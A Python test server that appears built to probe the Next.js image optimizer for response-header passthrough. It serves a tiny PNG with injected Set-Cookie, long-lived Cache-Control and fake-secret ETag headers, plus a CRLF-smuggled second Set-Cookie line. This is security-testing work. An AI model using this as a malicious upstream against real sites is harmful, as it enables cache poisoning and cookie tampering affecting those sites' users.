#!/usr/bin/env python3
"""
Header Injection Test Server
=============================

Tests if Next.js image optimizer is vulnerable to response header injection.
If the upstream server returns headers that get passed through to the client,
this could be exploited for:
1. Cache poisoning (via Cache-Control manipulation)
2. Cookie stealing (via Set-Cookie)
3. XSS via Content-Type
4. Open redirect via Location header injection
"""

from http.server import HTTPServer, BaseHTTPRequestHandler

class HeaderInjectionHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"\n[HEADER INJECTION] Request: {self.path}")
        
        if '/inject-cookie' in self.path:
            # Try to inject a Set-Cookie header
            self.send_response(200)
            self.send_header('Content-Type', 'image/png')
            self.send_header('Set-Cookie', 'stolen=value; Path=/')
            self.send_header('X-Injected-Header', 'evil-value')
            self.send_header('Cache-Control', 'public, max-age=31536000')
            
        elif '/inject-crlf' in self.path:
            # Try CRLF injection in header value
            try:
                self.send_response(200)
                self.send_header('Content-Type', 'image/png')
                # Note: Modern Python HTTP server escapes CRLF
                self.send_header('X-Test', 'value\r\nSet-Cookie: crlf=injected')
            except:
                pass
                
        elif '/inject-etag' in self.path:
            # Try to inject sensitive data via ETag
            self.send_response(200)
            self.send_header('Content-Type', 'image/png')
            self.send_header('ETag', '"SECRET_API_KEY_12345"')
            
        else:
            # Normal response
            self.send_response(200)
            self.send_header('Content-Type', 'image/png')
        
        # Send minimal valid PNG
        png = bytes([
            0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
            0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
            0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
            0xde, 0x00, 0x00, 0x00, 0x0c, 0x49, 0x44, 0x41,
            0x54, 0x08, 0xd7, 0x63, 0xf8, 0xcf, 0xc0, 0x00,
            0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0xfe,
            0xd4, 0xef, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45,
            0x4e, 0x44, 0xae, 0x42, 0x60, 0x82
        ])
        
        self.send_header('Content-Length', len(png))
        self.end_headers()
        self.wfile.write(png)
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    port = 9805
    print("=" * 60)
    print(" Header Injection Test Server")
    print("=" * 60)
    print(f"\nListening on 127.0.0.1:{port}")
    print("\nTest endpoints:")
    print(f"  /inject-cookie - Tests Set-Cookie header passthrough")
    print(f"  /inject-crlf   - Tests CRLF injection")
    print(f"  /inject-etag   - Tests ETag data exfiltration")
    print("=" * 60)
    
    HTTPServer(('127.0.0.1', port), HeaderInjectionHandler).serve_forever()
